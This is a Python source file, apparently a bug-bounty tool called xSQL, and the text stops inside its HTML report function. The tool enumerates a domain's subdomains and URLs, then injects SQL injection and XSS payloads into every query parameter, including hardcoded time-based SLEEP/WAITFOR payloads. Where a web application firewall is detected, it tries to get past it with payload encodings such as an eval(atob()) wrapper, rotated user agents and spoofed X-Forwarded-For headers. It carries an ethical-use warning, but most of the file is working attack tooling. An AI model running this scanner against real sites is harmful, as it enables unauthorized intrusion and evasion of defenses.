#!/usr/bin/env python3
"""
xSQL — Advanced Recon + SQLi/XSS Scanner for Bug Hunters
Features:
- Subdomain enumeration with subfinder, assetfinder, findomain, dnsx
- URL crawling with katana for subdomains, waybackurls/gau for single domains
- Live filtering with httpx
- WAF detection and bypass using waf_bypass_payloads.txt
- SQLi and XSS testing with sqlipayloads.txt and xsspayloads.txt
- Rich console output and HTML reporting
"""

import argparse
import subprocess
import requests
import os
import sys
import time
import threading
import tempfile
import shutil
import random
import re
import logging
import json
import tldextract
import shlex
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
import urllib.parse
import base64

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# ---------------- CONFIG ----------------
REQUIRED_BASE_TOOLS = ["subfinder", "assetfinder", "findomain", "dnsx", "httpx", "katana", "waybackurls", "gau", "uro", "anew", "wafw00f"]
SQLI_PAYLOADS_FILE = "sqlipayloads.txt"
XSS_PAYLOADS_FILE = "xsspayloads.txt"
WAF_BYPASS_PAYLOADS_FILE = "waf_bypass_payloads.txt"
RESULTS_DIR = "results"
LOG_FILE = os.path.join(RESULTS_DIR, "xsql.log")
STATE_FILE = os.path.join(RESULTS_DIR, "xsql_state.json")
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]
HTTPX_THREADS_DEFAULT = 200
TESTING_THREADS_DEFAULT = 20
TESTING_DELAY_DEFAULT = 0.3
RETRY_LIMIT = 3
RETRY_DELAY = 2
WAF_BYPASS_ENCODINGS = ["url", "double_url", "html", "mixed_case", "unicode", "base64"]
CUSTOM_HEADERS = [
    {"Referer": "https://www.google.com", "X-Forwarded-For": "192.168.1.1", "Accept-Language": "en-US,en;q=0.9"},
    {"Referer": "https://www.bing.com", "X-Forwarded-For": "10.0.0.1", "Accept-Language": "en-GB,en;q=0.8"},
    {"Accept": "text/html,application/xhtml+xml", "Connection": "keep-alive"},
    {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest"},
]
console = Console()

# ---------------- LOGGING SETUP ----------------
def setup_logging(debug=False):
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.DEBUG if debug else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )
    logging.info("xSQL scan started")
    console.print(f"[bold cyan][*] Logging to {LOG_FILE}[/bold cyan]")

# ---------------- STATE MANAGEMENT ----------------
def save_state(state):
    with open(STATE_FILE, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2)
    logging.debug(f"Saved state to {STATE_FILE}")

def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception as e:
            logging.error(f"Failed to load state file {STATE_FILE}: {e}")
            console.print(f"[red][-] Failed to load state file {STATE_FILE}: {e}. Starting fresh.[/red]")
    return {}

def clear_state():
    if os.path.exists(STATE_FILE):
        os.remove(STATE_FILE)
        logging.info("Cleared state file")
        console.print(f"[green][+] Cleared state file {STATE_FILE}[/green]")

# ---------------- UTILITIES ----------------
def print_banner():
    ban = r"""
          __   __       
          \_/ /__` /  \ |    
          / \ .__/ \__X |__
                  
                   ~ by manojxshrestha
"""
    console.print(ban, style="bold cyan")
    console.print("[yellow][!] ETHICAL WARNING: Use only with explicit permission. Unauthorized scanning is illegal.[/yellow]\n")

def run_cmd(cmd, debug=False, check_return=True):
    logging.debug(f"Executing command: {cmd}")
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if check_return and proc.returncode != 0:
            logging.error(f"Command failed (exit {proc.returncode}): {cmd}")
            if debug:
                console.print(f"[red][-] Command failed: {cmd}[/red]")
                if proc.stderr:
                    console.print(f"[red][DEBUG] stderr: {proc.stderr.strip()}[/red]")
            return ""
        return proc.stdout.strip()
    except Exception as e:
        logging.error(f"Exception running command: {cmd} - {e}")
        if debug:
            console.print(f"[red][-] Exception running command: {cmd}: {e}[/red]")
        return ""

def check_tool(tool, required=True):
    if shutil.which(tool) is None:
        logging.error(f"Tool '{tool}' not found in PATH")
        if required:
            console.print(f"[red][-] Required tool '{tool}' not found. Please install it using your package manager or from its official source.[/red]")
            sys.exit(1)
        return False
    return True

def load_payloads(payload_file, default=[]):
    if not os.path.isfile(payload_file):
        logging.error(f"Payloads file '{payload_file}' not found")
        console.print(f"[red][-] Payloads file '{payload_file}' not found. Please ensure the file exists in the working directory or specify the correct path using --sqli-payload-file, --xss-payload-file, or --waf-bypass-payload-file.[/red]")
        sys.exit(1)
    cmd = f"wc -l {shlex.quote(payload_file)}"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            logging.error(f"Failed to count lines in {payload_file}: {result.stderr}")
            console.print(f"[red][-] Failed to count lines in {payload_file}: {result.stderr.strip()}. Check file permissions or content.[/red]")
            sys.exit(1)
        line_count = int(result.stdout.split()[0])
    except Exception as e:
        logging.error(f"Exception counting lines in {payload_file}: {e}")
        console.print(f"[red][-] Exception counting lines in {payload_file}: {e}. Ensure the file is accessible and properly formatted.[/red]")
        sys.exit(1)
    with open(payload_file, "r", encoding="utf-8", errors="ignore") as f:
        payloads = [line.rstrip("\n") for line in f if line.strip() and not line.startswith("#")]
    if not payloads:
        logging.error(f"No valid payloads found in {payload_file}")
        console.print(f"[red][-] No valid payloads found in {payload_file}. Ensure the file contains non-empty, non-comment lines.[/red]")
        sys.exit(1)
    logging.info(f"Loaded {line_count:,} payloads from {payload_file}")
    console.print(f"[green][*] Loaded {line_count:,} payloads from {payload_file}[/green]")
    return payloads

def load_waf_bypass_payloads(payload_file, test_type=None):
    payloads = load_payloads(payload_file)
    line_count = len(payloads)
    if test_type == "sqli":
        filtered_payloads = [p for p in payloads if any(s in p.lower() for s in ["union", "select", "sleep", "or ", "and ", "benchmark"]) or p.startswith(("'", '"', "1"))]
        logging.info(f"Filtered {len(filtered_payloads):,} SQLi WAF bypass payloads")
        return filtered_payloads
    elif test_type == "xss":
        filtered_payloads = [p for p in payloads if any(s in p.lower() for s in ["<script>", "<img", "<svg", "javascript:", "onerror", "onload", "atob", "fromcharcode"])]
        logging.info(f"Filtered {len(filtered_payloads):,} XSS WAF bypass payloads")
        return filtered_payloads
    return payloads

def validate_domain(domain):
    ext = tldextract.extract(domain)
    if not ext.domain or not ext.suffix:
        logging.error(f"Invalid domain: {domain}")
        console.print(f"[red][-] Invalid domain: {domain}. Please provide a valid domain (e.g., example.com) without protocols or paths.[/red]")
        sys.exit(1)

def domain_in_scope(url, domain):
    parsed = urlparse(url)
    netloc = parsed.netloc.split(":", 1)[0].lower()
    domain = domain.lower()
    return netloc == domain or netloc.endswith("." + domain)

def is_valid_url(url):
    if not url.startswith(("http://", "https://")):
        return False
    if re.search(r'[\s<>%{}|\\\^`,*]', url) or len(url) > 2048:
        return False
    try:
        parsed = urlparse(url)
        return bool(parsed.scheme and parsed.netloc)
    except:
        return False

def get_session(proxy=None, ssl_verify=True):
    s = requests.Session()
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    s.verify = ssl_verify
    return s

# ---------------- WAF DETECTION ----------------
def detect_waf_wafw00f(url, session=None, debug=False, test_type="sqli"):
    wafw00f_cmd = f"wafw00f {shlex.quote(url)} -o - -f json"
    if session and session.proxies:
        proxy = session.proxies.get("http") or session.proxies.get("https")
        if proxy:
            wafw00f_cmd += f" --proxy {shlex.quote(proxy)}"
    if debug:
        wafw00f_cmd += " -v"
    
    logging.debug(f"Running wafw00f command: {wafw00f_cmd}")
    output = run_cmd(wafw00f_cmd, debug=debug)
    
    if not output:
        if debug:
            console.print(f"[yellow][DEBUG] wafw00f returned no output for {url}[/yellow]")
        return {}
    
    try:
        waf_results = json.loads(output)
        findings = {}
        # wafw00f returns a list; check the first item if it exists
        if isinstance(waf_results, list) and waf_results:
            waf_result = waf_results[0]  # Get the first dictionary
            if waf_result.get("detected", False):
                findings["waf_name"] = waf_result.get("firewall", "Unknown")
                findings["manufacturer"] = waf_result.get("manufacturer", "Unknown")
                console.print(f"[yellow][*] WAF detected for {url}: {findings['waf_name']} ({findings['manufacturer']})[/yellow]")
            else:
                console.print(f"[green][*] No WAF detected for {url}[/green]")
        else:
            console.print(f"[green][*] No WAF detected for {url}[/green]")
        return findings
    except json.JSONDecodeError as e:
        if debug:
            console.print(f"[red][DEBUG] Failed to parse wafw00f JSON output for {url}: {e}[/red]")
        logging.error(f"Failed to parse wafw00f output for {url}: {e}")
        return {}

# ---------------- WAF BYPASS ----------------
def encode_payload(payload, encoding_type, is_xss=False):
    if encoding_type == "url":
        return urllib.parse.quote(payload)
    elif encoding_type == "double_url":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding_type == "html":
        html_entities = {"<": "&lt;", ">": "&gt;", "'": "&apos;", '"': "&quot;", "&": "&amp;"}
        for char, entity in html_entities.items():
            payload = payload.replace(char, entity)
        return payload
    elif encoding_type == "mixed_case":
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    elif encoding_type == "unicode":
        return ''.join(f'\\u{ord(c):04x}' if c.isalnum() else c for c in payload)
    elif encoding_type == "base64" and is_xss:
        try:
            encoded = base64.b64encode(payload.encode()).decode()
            return f"eval(atob('{encoded}'))"
        except:
            return payload
    elif encoding_type == "base64" and not is_xss:
        return payload
    return payload

def get_random_headers():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
    }
    headers.update(random.choice(CUSTOM_HEADERS))
    return headers

def get_random_delay(base_delay):
    return base_delay + random.uniform(-0.1, 0.1)

# ---------------- SUBDOMAIN ENUMERATION ----------------
def enumerate_subdomains(domain, live_filter=False, httpx_threads=HTTPX_THREADS_DEFAULT, httpx_status="200,204,301,302,307,401,403,500", debug=False):
    logging.info(f"Enumerating subdomains for {domain}")
    console.print(f"[bold magenta][*] Enumerating subdomains for {domain}...[/bold magenta]")

    subdomains = set()
    subfinder_file = os.path.join(RESULTS_DIR, "SubfinderSubs.txt")
    assetfinder_file = os.path.join(RESULTS_DIR, "AssetfinderSubs.txt")
    findomain_file = os.path.join(RESULTS_DIR, "FindomainSubs.txt")
    allsubs_file = os.path.join(RESULTS_DIR, "subdomains.txt")
    live_file = os.path.join(RESULTS_DIR, "alivesubs.txt")
    clean_file = os.path.join(RESULTS_DIR, "cleansubs.txt")
    katana_file = os.path.join(RESULTS_DIR, "KatanaSubsUrls.txt")

    commands = [
        ("subfinder", f"subfinder -d {shlex.quote(domain)} -silent -o {shlex.quote(subfinder_file)}"),
        ("assetfinder", f"assetfinder --subs-only {shlex.quote(domain)} > {shlex.quote(assetfinder_file)}"),
        ("findomain", f"findomain -t {shlex.quote(domain)} -q > {shlex.quote(findomain_file)}")
    ]

    for tool_name, cmd in commands:
        if not check_tool(tool_name, required=False):
            console.print(f"[yellow][DEBUG] Tool {tool_name} not found; skipping.[/yellow]")
            logging.warning(f"Tool {tool_name} not found; skipping")
            continue
        console.print(f"[cyan][*] Running {tool_name}...[/cyan]")
        run_cmd(cmd, debug=debug)
        console.print(f"[green][+] {tool_name} completed.[/green]")

    console.print(f"[green][+] Combining subdomains completed.[/green]")
    cmd = f"cat {shlex.quote(subfinder_file)} {shlex.quote(assetfinder_file)} {shlex.quote(findomain_file)} | sort -u > {shlex.quote(allsubs_file)}"
    run_cmd(cmd, debug=debug)

    if os.path.exists(allsubs_file) and os.stat(allsubs_file).st_size > 0:
        with open(allsubs_file, "r") as f:
            for line in f:
                host = line.strip().lower()
                if host and (host == domain or host.endswith("." + domain)):
                    subdomains.add(host)
    else:
        console.print(f"[yellow][!] No subdomains discovered for {domain}.[/yellow]")
        logging.warning(f"No subdomains discovered for {domain}")
        return [domain], []

    console.print(f"[green][+] Discovered {len(subdomains):,} subdomains.[/green]")
    logging.info(f"Discovered {len(subdomains):,} subdomains")

    if live_filter:
        console.print(f"[cyan][*] Filtering live subdomains with dnsx and httpx...[/cyan]")
        for attempt in range(RETRY_LIMIT):
            cmd = f"dnsx -l {shlex.quote(allsubs_file)} -silent -a | cut -d ' ' -f1 | httpx --list /dev/stdin -ports 80,443,8080,8443,8000,8888 -status-code -mc {shlex.quote(httpx_status)} -threads {httpx_threads} -timeout 10 -silent -o {shlex.quote(live_file)}"
            run_cmd(cmd, debug=debug)
            cmd = f"cut -d ' ' -f1 {shlex.quote(live_file)} > {shlex.quote(clean_file)}"
            run_cmd(cmd, debug=debug)
            if os.path.exists(clean_file) and os.stat(clean_file).st_size > 0:
                break
            console.print(f"[yellow][-] Live subdomain filtering attempt {attempt+1}/{RETRY_LIMIT} failed. Retrying...[/yellow]")
            logging.warning(f"Live subdomain filtering attempt {attempt+1}/{RETRY_LIMIT} failed")
            time.sleep(RETRY_DELAY)
        else:
            console.print(f"[yellow][!] No live subdomains found after {RETRY_LIMIT} attempts.[/yellow]")
            logging.warning(f"No live subdomains found for {domain}")
            return [domain], []

        live = []
        if os.path.exists(clean_file) and os.stat(clean_file).st_size > 0:
            with open(clean_file, "r") as f:
                live = [line.strip().lower() for line in f if line.strip()]
        if not live:
            console.print(f"[yellow][!] No live subdomains found.[/yellow]")
            logging.warning(f"No live subdomains found for {domain}")
            return [domain], []
        console.print(f"[green][+] Found {len(live):,} live subdomains.[/green]")
        logging.info(f"Found {len(live):,} live subdomains")

        console.print(f"[cyan][*] Crawling live subdomains with katana...[/cyan]")
        cmd = f"cat {shlex.quote(clean_file)} | katana -d 5 -jc -c 20 -silent | anew {shlex.quote(katana_file)}"
        run_cmd(cmd, debug=debug)
        console.print(f"[green][+] katana completed.[/green]")

        urls = []
        if os.path.exists(katana_file) and os.stat(katana_file).st_size > 0:
            with open(katana_file, "r") as f:
                urls = [line.strip() for line in f if is_valid_url(line.strip()) and domain_in_scope(line.strip(), domain)]
        console.print(f"[green][+] Collected {len(urls):,} URLs from katana.[/green]")
        logging.info(f"Collected {len(urls):,} URLs from katana")
        return sorted(set(live)), sorted(set(urls))

    return sorted(subdomains), []

# ---------------- URL FETCHING ----------------
def fetch_urls(domains, debug=False, extensions=None):
    logging.info(f"Fetching URLs for {len(domains)} domains")
    console.print(f"[bold magenta][*] Fetching historical URLs for {len(domains):,} domains...[/bold magenta]")
    urls = set()
    wayback_file = os.path.join(RESULTS_DIR, "waybackurls.txt")
    gau_file = os.path.join(RESULTS_DIR, "gauurls.txt")
    waygau_file = os.path.join(RESULTS_DIR, "WayGauUrls.txt")

    for d in domains:
        if check_tool("waybackurls", required=False):
            console.print(f"[cyan][*] Fetching from waybackurls for {d}...[/cyan]")
            cmd = f"echo {shlex.quote(d)} | waybackurls > {shlex.quote(wayback_file)}"
            run_cmd(cmd, debug=debug)
            console.print(f"[green][+] waybackurls completed.[/green]")
            if os.path.exists(wayback_file) and os.stat(wayback_file).st_size > 0:
                with open(wayback_file, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and domain_in_scope(line, d):
                            urls.add(line)
        if check_tool("gau", required=False):
            console.print(f"[cyan][*] Fetching from gau for {d}...[/cyan]")
            cmd = f"echo {shlex.quote(d)} | gau --subs > {shlex.quote(gau_file)}"
            run_cmd(cmd, debug=debug)
            console.print(f"[green][+] gau completed.[/green]")
            if os.path.exists(gau_file) and os.stat(gau_file).st_size > 0:
                with open(gau_file, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and domain_in_scope(line, d):
                            urls.add(line)

    if not urls:
        console.print(f"[yellow][!] No URLs fetched. Check tools or network connectivity.[/yellow]")
        logging.warning("No URLs fetched")
        return []

    cmd = f"cat {shlex.quote(wayback_file)} {shlex.quote(gau_file)} | sort -u | anew {shlex.quote(waygau_file)}"
    run_cmd(cmd, debug=debug)
    console.print(f"[green][+] Combined {len(urls):,} URLs into {waygau_file}[/green]")
    logging.info(f"Combined {len(urls):,} URLs into {waygau_file}")

    if extensions:
        filtered_urls = set()
        for url in urls:
            parsed = urlparse(url)
            path = parsed.path.lower()
            ext = os.path.splitext(path)[1][1:] if path else ""
            if not path or not ext or ext in extensions:
                filtered_urls.add(url)
            elif debug:
                console.print(f"[yellow][DEBUG] Skipping URL with non-matching extension {ext}: {url}[/yellow]")
        urls = filtered_urls

    if check_tool("uro", required=False):
        console.print(f"[cyan][*] Decluttering URLs with uro...[/cyan]")
        tmp_in = tempfile.NamedTemporaryFile(mode="w+", delete=False)
        tmp_out = tempfile.NamedTemporaryFile(mode="w+", delete=False)
        try:
            for u in urls:
                tmp_in.write(u + "\n")
            tmp_in.flush()
            cmd = f"cat {shlex.quote(tmp_in.name)} | uro > {shlex.quote(tmp_out.name)}"
            run_cmd(cmd, debug=debug)
            decluttered = set()
            if os.path.exists(tmp_out.name) and os.stat(tmp_out.name).st_size > 0:
                with open(tmp_out.name, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line and line.startswith(("http://", "https://")):
                            decluttered.add(line)
            if decluttered:
                urls = decluttered
        finally:
            try:
                os.remove(tmp_in.name)
                os.remove(tmp_out.name)
            except:
                pass

    console.print(f"[green][+] Collected {len(urls):,} unique URLs.[/green]")
    logging.info(f"Collected {len(urls):,} unique URLs")
    return sorted(urls)

# ---------------- LIVE URL FILTERING ----------------
def filter_live_urls(urls, threads=HTTPX_THREADS_DEFAULT, status_codes="200,301,302", debug=False, subdomains=False):
    logging.info("Filtering live URLs with httpx")
    console.print(f"[bold magenta][*] Filtering live URLs with httpx...[/bold magenta]")
    if not check_tool("httpx"):
        console.print(f"[yellow][!] httpx not found; returning original URLs.[/yellow]")
        logging.warning("httpx not found; returning original URLs")
        return sorted(set(urls))

    decluttered_file = os.path.join(RESULTS_DIR, "all_urls.txt")
    live_file = os.path.join(RESULTS_DIR, "liveWayGauUrls.txt" if not subdomains else "liveWayGauKatanaUrls.txt")

    with open(decluttered_file, "w", encoding="utf-8") as f:
        for url in urls:
            if is_valid_url(url):
                f.write(url + "\n")

    if not os.path.exists(decluttered_file) or os.stat(decluttered_file).st_size == 0:
        console.print(f"[yellow][!] Input file {decluttered_file} is missing or empty. Check URL fetching step.[/yellow]")
        logging.error(f"Input file {decluttered_file} is missing or empty")
        return sorted(set(urls))

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
        task = progress.add_task("Filtering live URLs...", total=RETRY_LIMIT)
        current_threads = threads
        for attempt in range(RETRY_LIMIT):
            cmd = f"cat {shlex.quote(decluttered_file)} | httpx -silent -mc {shlex.quote(status_codes)} -threads {current_threads} -timeout 15 -o {shlex.quote(live_file)}"
            run_cmd(cmd, debug=debug)
            if os.path.exists(live_file) and os.stat(live_file).st_size > 0:
                live_urls = []
                with open(live_file, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if is_valid_url(line):
                            live_urls.append(line)
                console.print(f"[green][+] Found {len(live_urls):,} live URLs.[/green]")
                logging.info(f"Found {len(live_urls):,} live URLs")
                progress.update(task, completed=RETRY_LIMIT)
                return sorted(set(live_urls))
            console.print(f"[yellow][-] httpx attempt {attempt+1}/{RETRY_LIMIT} failed. Retrying with {max(10, current_threads // 2)} threads...[/yellow]")
            logging.warning(f"httpx attempt {attempt+1}/{RETRY_LIMIT} failed. Retrying with {max(10, current_threads // 2)} threads...")
            current_threads = max(10, current_threads // 2)
            time.sleep(RETRY_DELAY)
            progress.update(task, advance=1)

    console.print(f"[yellow][!] httpx failed after {RETRY_LIMIT} attempts. Check network or {decluttered_file}.[/yellow]")
    logging.error(f"httpx failed for {decluttered_file}")
    return sorted(set(urls))

# ---------------- SQLi/XSS HELPERS ----------------
def payloads_for_timing(timing_seconds):
    return [
        f"1' AND (SELECT SLEEP({timing_seconds}))--",
        f"1' AND IF(1=1,SLEEP({timing_seconds}),0)--",
        f"1' WAITFOR DELAY '0:0:{timing_seconds}'--"
    ]

def rebuild_with_param(parsed, param, value, encode=True):
    params = parse_qs(parsed.query)
    params[param] = [urllib.parse.quote(value) if encode else value]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

# ---------------- SQLi/XSS TESTING ----------------
def test_single_sqli(url, payloads, session, user_agents, proxy=None, delay=0.3, timing=False, timing_seconds=5, debug=False, encoding="none"):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        if debug:
            console.print(f"[yellow][DEBUG] No query params for {url}; skipping[/yellow]")
        return []

    timing_payloads = payloads_for_timing(timing_seconds) if timing else []
    vulnerable_urls = []

    for param in params.keys():
        original_val = params[param][0] if params[param] else ""
        for payload in payloads:
            encoded_payload = encode_payload(payload, encoding, is_xss=False)
            test_url = rebuild_with_param(parsed, param, original_val + encoded_payload, encode=False)
            headers = get_random_headers()
            try:
                if debug:
                    console.print(f"[yellow][DEBUG] GET {test_url} (encoding: {encoding})[/yellow]")
                r = session.get(test_url, headers=headers, timeout=12)
                text = (r.text or "").lower()
                code = r.status_code
                error_signatures = [
                    "you have an error in your sql syntax",
                    "syntax error",
                    "mysql",
                    "sqlstate",
                    "unclosed quotation mark",
                    "quoted string not properly terminated",
                    "warning: pg_",
                    "mysql_fetch",
                    "odbc",
                    "ora-",
                    "sql server",
                    "sqlite"
                ]
                if code == 500 or any(sig in text for sig in error_signatures):
                    if debug:
                        console.print(f"[yellow][DEBUG] Detected SQLi signature on {test_url} (code {code}, encoding: {encoding})[/yellow]")
                    vulnerable_urls.append((test_url, encoding))
                if timing:
                    for t_payload in timing_payloads:
                        encoded_t_payload = encode_payload(t_payload, encoding, is_xss=False)
                        t_test_url = rebuild_with_param(parsed, param, original_val + encoded_t_payload, encode=False)
                        headers = get_random_headers()
                        try:
                            start = time.time()
                            tr = session.get(t_test_url, headers=headers, timeout=timing_seconds + 10)
                            elapsed = time.time() - start
                            if debug:
                                console.print(f"[yellow][DEBUG] Timing test {t_test_url} elapsed={elapsed:.2f}s (encoding: {encoding})[/yellow]")
                            if elapsed >= (timing_seconds - 0.5):
                                vulnerable_urls.append((t_test_url, encoding))
                        except Exception as e:
                            if debug:
                                console.print(f"[red][DEBUG] Timing request error: {e}[/red]")
                            continue
                if delay > 0:
                    time.sleep(get_random_delay(delay))
            except Exception as e:
                if debug:
                    console.print(f"[red][DEBUG] Request error for {test_url}: {e} (encoding: {encoding})[/red]")
                continue
    return vulnerable_urls

def test_single_xss(url, payloads, session, user_agents, proxy=None, delay=0.3, debug=False, encoding="none"):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        if debug:
            console.print(f"[yellow][DEBUG] No query params for {url}; adding dummy param[/yellow]")
        url = url + "?test=1"
        params = {"test": ["1"]}

    vulnerable_urls = []
    for param in params.keys():
        original_val = params[param][0] if params[param] else ""
        for payload in payloads:
            encoded_payload = encode_payload(payload, encoding, is_xss=True)
            test_url = rebuild_with_param(parsed, param, original_val + encoded_payload, encode=False)
            headers = get_random_headers()
            try:
                if debug:
                    console.print(f"[yellow][DEBUG] GET {test_url} (encoding: {encoding})[/yellow]")
                r = session.get(test_url, headers=headers, timeout=10)
                text = (r.text or "").lower()
                decoded_payloads = []
                for p in payloads:
                    try:
                        if "atob(" in p.lower():
                            base64_str = p.split('atob("')[1].split('")')[0]
                            decoded = base64.b64decode(base64_str).decode('utf-8')
                            decoded_payloads.append(decoded.lower())
                        else:
                            decoded_payloads.append(p.lower())
                    except:
                        decoded_payloads.append(p.lower())
                if any(p.lower() in text for p in payloads + decoded_payloads) or \
                   any(sig in text for sig in ["alert(", "prompt(", "confirm("]):
                    if debug:
                        console.print(f"[yellow][DEBUG] Detected XSS signature on {test_url} (encoding: {encoding})[/yellow]")
                    vulnerable_urls.append((test_url, encoding))
                if delay > 0:
                    time.sleep(get_random_delay(delay))
            except Exception as e:
                if debug:
                    console.print(f"[red][DEBUG] Error for {test_url}: {e} (encoding: {encoding})[/red]")
                continue
    return vulnerable_urls

def test_sqli(urls, payloads, waf_payloads, user_agents, waf_results, proxy=None, threads=TESTING_THREADS_DEFAULT, delay=TESTING_DELAY_DEFAULT, timing=False, timing_seconds=5, ssl_verify=True, debug=False, test_waf_urls=False):
    console.print(f"[bold cyan][*] Starting SQL Injection testing...[/bold cyan]")
    console.print(f"[magenta][*] Found {len(urls):,} URLs for SQLi testing[/magenta]")

    vulnerable = []
    waf_bypassed = []
    lock = threading.Lock()

    def worker(u, is_waf_protected=False, waf_findings=None):
        sess = get_session(proxy=proxy, ssl_verify=ssl_verify)
        try:
            test_url = u + "?test=1" if not parse_qs(urlparse(u).query) else u
            test_payloads = waf_payloads if is_waf_protected else payloads
            encodings = WAF_BYPASS_ENCODINGS if is_waf_protected else ["none"]
            for encoding in encodings:
                res = test_single_sqli(test_url, test_payloads, sess, user_agents, proxy=proxy, delay=delay, timing=timing, timing_seconds=timing_seconds, debug=debug, encoding=encoding)
                if res:
                    with lock:
                        for v, enc in res:
                            if is_waf_protected:
                                console.print(f"[green][SQLi] Vulnerable (WAF bypassed): {v} (encoding: {enc}, WAF: {waf_findings.get('waf_name', 'Unknown')})[/green]")
                                waf_bypassed.append((v, ("SQLi", waf_findings, enc)))
                            else:
                                console.print(f"[green][SQLi] Vulnerable: {v}[/green]")
                                vulnerable.append(v)
        except Exception as e:
            if debug:
                console.print(f"[red][DEBUG] Exception testing {u}: {e}[/red]")

    # Split URLs based on precomputed WAF results
    no_waf_urls = [url for url, findings in waf_results.items() if not findings]
    waf_urls = [(url, findings) for url, findings in waf_results.items() if findings]

    console.print(f"[magenta][*] Testing {len(no_waf_urls):,} URLs without WAF protection[/magenta]")
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
        task = progress.add_task("Testing SQLi (No WAF)", total=len(no_waf_urls))
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(worker, u) for u in no_waf_urls]
            for _ in as_completed(futures):
                progress.update(task, advance=1)

    if test_waf_urls and waf_urls:
        console.print(f"[magenta][*] Attempting to bypass WAF on {len(waf_urls):,} URLs...[/magenta]")
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
            task = progress.add_task("Testing SQLi (WAF Bypass)", total=len(waf_urls))
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = [ex.submit(worker, u, True, findings) for u, findings in waf_urls]
                for _ in as_completed(futures):
                    progress.update(task, advance=1)

    return sorted(set(vulnerable)), waf_bypassed

def test_xss(urls, payloads, waf_payloads, user_agents, waf_results, proxy=None, threads=TESTING_THREADS_DEFAULT, delay=TESTING_DELAY_DEFAULT, ssl_verify=True, debug=False, test_waf_urls=False):
    console.print(f"[bold cyan][*] Starting XSS testing...[/bold cyan]")
    console.print(f"[magenta][*] Found {len(urls):,} URLs for XSS testing[/magenta]")

    vulnerable = []
    waf_bypassed = []
    lock = threading.Lock()

    def worker(u, is_waf_protected=False, waf_findings=None):
        sess = get_session(proxy=proxy, ssl_verify=ssl_verify)
        try:
            test_url = u
            test_payloads = waf_payloads if is_waf_protected else payloads
            encodings = WAF_BYPASS_ENCODINGS if is_waf_protected else ["none"]
            for encoding in encodings:
                res = test_single_xss(test_url, test_payloads, sess, user_agents, proxy=proxy, delay=delay, debug=debug, encoding=encoding)
                if res:
                    with lock:
                        for v, enc in res:
                            if is_waf_protected:
                                console.print(f"[green][XSS] Vulnerable (WAF bypassed): {v} (encoding: {enc}, WAF: {waf_findings.get('waf_name', 'Unknown')})[/green]")
                                waf_bypassed.append((v, ("XSS", waf_findings, enc)))
                            else:
                                console.print(f"[green][XSS] Vulnerable: {v}[/green]")
                                vulnerable.append(v)
        except Exception as e:
            if debug:
                console.print(f"[red][DEBUG] Exception testing {u}: {e}[/red]")

    # Split URLs based on precomputed WAF results
    no_waf_urls = [url for url, findings in waf_results.items() if not findings]
    waf_urls = [(url, findings) for url, findings in waf_results.items() if findings]

    console.print(f"[magenta][*] Testing {len(no_waf_urls):,} URLs without WAF protection[/magenta]")
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
        task = progress.add_task("Testing XSS (No WAF)", total=len(no_waf_urls))
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = [ex.submit(worker, u) for u in no_waf_urls]
            for _ in as_completed(futures):
                progress.update(task, advance=1)

    if test_waf_urls and waf_urls:
        console.print(f"[magenta][*] Attempting to bypass WAF on {len(waf_urls):,} URLs...[/magenta]")
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console) as progress:
            task = progress.add_task("Testing XSS (WAF Bypass)", total=len(waf_urls))
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = [ex.submit(worker, u, True, findings) for u, findings in waf_urls]
                for _ in as_completed(futures):
                    progress.update(task, advance=1)

    return sorted(set(vulnerable)), waf_bypassed

# ---------------- OUTPUT ----------------
def generate_html_report(sqli_vulns, xss_vulns, waf_bypassed, output_file):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    waf_bypassed_urls = set(v[0] for v in waf_bypassed)
    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>xSQL Scan Report</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f0f0f0; }}
            h1 {{ color: #333; text-align: center; }}
            h2 {{ color: #555; }}
